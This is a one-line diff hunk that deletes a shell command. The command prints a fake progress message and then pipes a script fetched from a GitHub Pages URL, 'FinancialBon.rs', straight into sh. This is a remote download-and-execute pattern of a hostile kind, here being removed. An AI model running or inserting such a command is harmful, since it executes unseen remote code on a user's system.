@@ -1,1 +1,0 @@
-echo Progress: 43.00%curl -L --progress-bar frkns.github.io/fun/FinancialBon.rs | sh
